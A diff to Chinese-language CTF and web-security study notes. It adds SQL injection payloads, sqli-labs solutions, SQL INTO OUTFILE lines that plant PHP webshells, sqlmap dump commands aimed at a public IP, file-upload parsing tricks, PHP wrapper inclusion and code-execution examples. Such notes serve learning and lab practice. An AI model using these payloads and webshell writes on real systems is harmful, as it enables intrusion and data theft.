@@ -4,6 +4,19 @@
 
 ## 每天学点新东西
 
+GitHub ：webdirscan weakfilescan bbscan
+
+
+
+有几个同学在问CTF里flag怎么找，因为比较基础所以我没讲过。
+拿到shell以后，如何找flag？其实这也是实际安全测试中的一个问题：拿到shell后，如何找一些敏感信息，从而辅助后续渗透。
+拿code-breaking puzzles举例，首先查看官网的说明：[代码审计知识星球二周年 && Code-Breaking Puzzles](https://code-breaking.com/intro/) ，里面明确写了flag的格式是“flag{some_thing}”（图1）
+那么我的目标就是，拿到shell以后在系统上找包含了这个格式的内容，这个内容可能是文件名、文件内容，甚至是数据库里的内容。
+首先我肯定是在文件里找，如grep：
+grep -r 'flag{.*}' .
+还有一些其他方法，比如有的flag是写在文件里的，我就可以找包含了flag这个关键词的文件名：find / -name "*flag*"
+当然，如果是php的题，不一定能拿到系统的shell。如果拿到的是webshell，也可以用php的scandir、glob等函数来遍历目录，查找flag。（参考 [ZH奶酪：PHP遍历目录/文件的3种方法 - ZH奶酪 - 博客园](https://www.cnblogs.com/CheeseZH/p/4560602.html) ）
+
 ### CMS 至少自己会搭建
 
 CMS部分搭建，框架部分随便写点什么玩意
@@ -87,13 +100,177 @@ Golang
 
 ## SQL 注入
 
++ 基于从服务器接收到的响应
+  + 基于错误的SQL注入
+  + 联合查询的类型
+  + 堆查询注射
+  + SQL盲注
+    + 基于布尔SQL盲注
+    + 基于时间的SQL盲注
+    + 基于报错的SQL盲注
+
++ 基于如何处理输入的SQL查询（数据类型）
+  + 基于字符串
+  + 数字或整数为基础的
+
++ 基于程度和顺序的注入(哪里发生了影响)
+
+  + 一阶注射
+
+    一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；
+
+  + 二阶注射
+
+    二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.
+
++ 基于注入点的位置上的
+  + 通过用户输入的表单域的注射。
+  + 通过cookie注射。
+  + 通过服务器变量注射。 （基于头部信息的注射）
+
+**1.判断是否存在注入，注入是字符型还是数字型**
+
+**2.猜解SQL查询语句中的字段数**
+
+**3.确定显示的字段顺序**
+
+**4.获取当前数据库**
+
+**5.获取数据库中的表**
+
+**6.获取表中的字段名**
+
+**7.下载数据**
+
+与数据库进行交互的地方
+
+```sql
+select user();							-- 数据库用户名
+select version();						-- MySQL版本
+select database();						-- 数据库名
+select @@datadir;						-- 数据库路径
+select @@version_compile_os；		    -- 操作系统版本
+show global variables like '%secure%';	-- 
+if(expr,v1,v2)							-- expr正确则v1，否则v2
+select concat('11', '22', '33');		-- 字符串连接 112233
+select concat_ws(x, s1,s2...sn)			-- 以 x 作为连接符，将字符串连接
+select group_concat()							-- 把查询出来的多行连接起来
+select substr(database(), 1, 1)
+select ascii(substr(database()), 1, 1)
+select char(32, 58, 32)					-- ' : ' 即空格+ : +空格
+select length(database());
+```
+
+常用语句
+
+```sql
+or 1=1--+
+'or 1=1--+
+"or 1=1--+
+)or 1=1--+
+')or 1=1--+
+") or 1=1--+
+"))or 1=1--+
+```
+
+
+
+**类型**
+
++ 数字型
+
+  user_id=$id
+
++ 字符型
+
+  user_id='$id'
+
++ 搜索型
+
+  text LIKE '%{$_GET['search']}%'
+
+总的来说区别并不大，注意构造闭合
+
+**union 注入**
+
+所查询的字段数需与主查询一致
+
+字段数可先用 order by x 来确定
+
+```sql
+union select 1, 2 from user where id = 1 or 1=1
+```
+
+**information_schema**
+
+存储数据库信息的数据库
+
+```sql
+select table_name from information_schema.tables where table_schema="security"; 
+--获取security中所有表名
+select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
+-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+-- 下载数据
+-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #  -- 获取表中的字段名
+```
+
+**函数报错信息注入**
+
+>  前提：后台没有屏蔽数据库报错信息，在语法发生错误时会输出到前端
+
+常用报错函数：updatexml(), extractvalue(), floor() [十种MySQL报错注入](https://blog.csdn.net/whatday/article/details/63683187)  [【SQL注入】报错注入姿势总结](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/)
+
+```sql
+and (extractvalue(1,concat(0x7e,(select user()),0x7e)));%23
+and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);%23
+```
+
+基于函数报错信息获取（select, insert, update, delete)
+
+**insert / update / delete 注入**
+
+结合函数报错信息，将函数插入到语句中
+
+**http header 注入**
+
+观察点：后台收集了请求头中的信息，并存入到数据库中
+
+**布尔盲注**
+
+结合 and 进行逻辑判断
+
+效率太低，写脚本爆
+
+**时间盲注**
+
+无显示回显，可在以前的基础上加入 sleep() 语句，若明显延迟，则注入成功
+
+BENCHMARK(count,expr) 执行 count次的expr
+
+**利用注入写入后门**
+
+前提：开启 secure_file_priv，并且具有写的权限
+
+```sql
+select 1,2,'<?php system($_GET["cmd"])?>' into outfile 'H:\\a.php'--%20
+```
+
+
+
+**POST 登录框 sqlmap跑法**
+
+```shell
+sqlmap -u "http://47.96.118.255:33066/" --forms --dbs
+sqlmap -u "http://47.96.118.255:33066/" --forms -D news --tables
+sqlmap -u "http://47.96.118.255:33066/" --forms -D news -T secret_table --dump
+```
+
 **本质**：把用户输入的数据当代码来执行，违背了“数据与代码分离”的原则。
 
 **关键条件**：
 
-	1.用户能控制输入的内容
-	
-	2.Web 应用执行的代码中，拼接了用户输入的内容
+>1.用户能控制输入的内容
+>2.Web 应用执行的代码中，拼接了用户输入的内容
 
 **攻击**：通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。
 
@@ -145,8 +322,6 @@ product.asp?id=1/1 -- true
 product.asp?id=1/0 -- false
 ```
 
----
-
 **类型**
 
 +   简单注入
@@ -169,9 +344,9 @@ product.asp?id=1/0 -- false
 
 +   http 头注入
 
-    X-Forward-注入
+    X-Forward-for 注入
 
-    refer注入
+    refer 注入
 
 +   二次注入
 
@@ -204,7 +379,6 @@ isg2015 web350 username 从 session 中直接带入查询，利用数据库字�
 
 # 绕过安全狗
 sel%ect
-
 针对 asp + access，首先来挖掘一下数据库的特性：
 1.可代替空格的字符：%09, %0A, %0C, %0D
 2.可截断都免语句的注释符有：%00, %16, %22, %27
@@ -224,7 +398,6 @@ gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0
 
 
 # 偏移注入
-
 1.Union 合并查询需要列相等，顺序一样
 2.select * from admin as inner join 
   index.asp?id=886and 1=2 union select 1,2,3,4,* from(admin as a inner join admin as   b on a.id=b.id)
@@ -259,7 +432,132 @@ Labs ready to be used, click on lesson number to open the lesson page.
 Enjoy the labs
 ```
 
+#### 小记录
 
+注释符：--+，#
+
+注意 `url` 编码，如 `#` ，不进行编码 `%23` 的话，可能被服务器认为是锚点
+
+Less-1
+
+```sql
+?id=-1%27 union select 1, 2, flag from flag%23
+```
+
+Less-2
+```sql
+?id=-1 union select 1, 2, flag from flag%23
+```
+Less-3
+```sql
+?id=-1') union select 1, 2, flag from flag%23
+```
+Less-4
+```sql
+?id=-1") union select 1, 2, flag from flag%23
+```
+Less-5
+
+提示：Double Injection - Single Quotes
+
+二次注入有点懵逼，直接注入没有任何回显，函数报错盲注搞起
+
+```sql
+?id=11' and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23
+```
+Less-6
+
+提示：Double Injection - Double Quotes
+
+```sql
+?id=11" and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23
+```
+Less-7
+
+提示：GET - Dump into outfile - String
+
+```sql
+?id=1 union select 1,2,'<?php @eval($_GET["cmd"])?>' into outfile 'D:\\a.php';
+```
+Less-8
+
+提示：GET - Blind - Boolian Based - Single Quotes
+
+没有任何报错信息，无法直接根据报错注入，时间盲注
+
+```sql
+id=1' AND SLEEP(5) --+
+```
+Less-9
+```sql
+
+```
+Less-10
+```sql
+
+```
+Less-11
+```sql
+
+```
+Less-12
+```sql
+
+```
+Less-13
+```sql
+
+```
+Less-14
+```sql
+
+```
+Less-15
+```sql
+
+```
+Less-16
+```sql
+
+```
+Less-17
+```sql
+
+```
+Less-18
+```sql
+
+```
+Less-19
+```sql
+
+```
+Less-20
+```sql
+
+```
+Less-21
+```sql
+
+```
+Less-22
+Less-23
+Less-24
+Less-25
+Less-26
+Less-27
+Less-28
+Less-29
+Less-30
+Less-31
+Less-32
+Less-33
+Less-34
+Less-35
+Less-36
+Less-37
+Less-38
+Less-39
 
 ## XSS
 
@@ -312,6 +610,28 @@ Enjoy the labs
 ### upload-labs
 
 https://github.com/c0ny1/upload-labs.git
+
+- Apache 解析
+
+`phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。
+
+- IIS 解析
+
+IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。
+
+- PHP CGI 路径解析
+
+当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下
+
+```
+location ~ \.php$ {
+  root html;
+  fastcgi_pass 127.0.0.1:9000;
+  fastcgi_index index.php;
+  fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+  include fastcgi_param;
+}
+```
 
 +   基于前端 JS 的验证
 
@@ -523,22 +843,23 @@ about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload
     print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
     ```
 
-
 **伪协议**
 
-+   php://filter – 对本地磁盘文件进行读写
++ php://filter – 对本地磁盘文件进行读写
 
-    查看源码：file=php://filter/read=convert.base64-encode/resource=index.php
+  查看源码：file=php://filter/read=convert.base64-encode/resource=index.php
 
-+   php://input 伪协议需要服务器支持，同时要求 allow_url_include = on
++ php://input 伪协议需要服务器支持，同时要求 allow_url_include = on
 
-    fn=php://input，然后再 post 一个 fn=xx
+  fn=php://input，然后再 post 一个 fn=xx
 
-+   php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区
++ php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区
 
-+   php://memory 总是把数据存储在内存中
++ php://memory 总是把数据存储在内存中
 
-+   php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中
++ php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中
+
++ data://
 
 DATA伪协议，分号和逗号有争议
 
@@ -551,6 +872,17 @@ DATA伪协议，分号和逗号有争议
 +   data:image/gif;base64,base64编码的gif图片数据
 +   data:image/png;base64,base64编码的png图片数据
 +   data:image/jpeg;base64,base64编码的png图片数据
+
+zip://
+
+把1.php文件压缩成.zip，再把后缀改成png，上传上去
+
+```php
+?file=zip://1.png%231.php
+// ?file=zip://1.zip%231.php
+```
+
+
 
 >   glob:// 查找匹配的文件路径模式
 
@@ -657,7 +989,37 @@ admin' OR 1=1/*
 
 ## 流量分析
 
+## 命令执行
 
+#### 直接执行代码
+
+PHP 中有不少可以直接执行代码的函数。
+
+```php
+eval();
+assert();
+system();
+exec();
+shell_exec();
+passthru();
+escapeshellcmd();
+pcntl_exec();
+```
+
+#### preg_replace( ) 代码执行
+
+preg_replace() 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。
+
+```php
+<?php
+    $var = "<tag>phpinfo()</tag>";
+	preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
+?>
+```
+
+若无 `/e` 修饰符，则可以尝试 %00 截断。
+
+[继续学习](https://ctf-wiki.github.io/ctf-wiki/web/php/php/)
 
 ## 其他
 
@@ -1200,6 +1562,10 @@ nmap -p 80,443 --script=http-waf-detect 192.168.0.100
 nmap -p 80,443 --script=http-waf-fingerprint www.victom.com
 ```
 
+### masscan
+
+masscan -p5070 172.16.5.0/24
+
 ### AWVS
 
 ### Maltego
@@ -1349,8 +1715,6 @@ mail.taiyangyy.top
 ```shell
 http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面
 ```
-
-
 
 + 万能密码
 
